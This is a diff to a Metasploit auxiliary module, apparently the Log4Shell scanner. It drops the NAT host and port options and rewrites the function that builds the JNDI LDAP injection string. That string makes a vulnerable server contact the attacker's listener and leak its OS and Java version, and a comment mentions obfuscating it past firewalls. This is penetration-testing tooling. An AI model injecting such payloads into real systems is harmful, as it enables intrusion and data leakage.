@@ -64,17 +64,10 @@ class MetasploitModule < Msf::Auxiliary
       ),
       OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 30 ])
     ])
-
-    register_advanced_options([
-      OptAddress.new('DNATHOST', [ false, 'The external IP of the attacking system behind a NAT', nil ]),
-      OptInt.new('DNATPORT', [ false, 'The external port of the attacking system behind a NAT', nil ]),
-    ])
   end
 
   def jndi_string(resource)
-    ldaphost = datastore['DNATHOST'].blank? ? datastore['SRVHOST'] : datastore['DNATHOST']
-    ldapport = datastore['DNATPORT'].blank? ? datastore['SRVPORT'] : datastore['DNATPORT']
-    js = "${jndi:ldap://#{ldaphost}:#{ldapport}/#{resource}/${java:os}/${sys:java.vendor}_${sys:java.version}}"
+    js = "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${java:os}/${sys:java.vendor}_${sys:java.version}}"
     # We should add obfuscation to the URL string to scan through lousy "next-gen" firewalls
     unless datastore['LEAK_PARAMS'].blank?
       js = js[0..-2] + '^' + datastore['LEAK_PARAMS'] + '}'
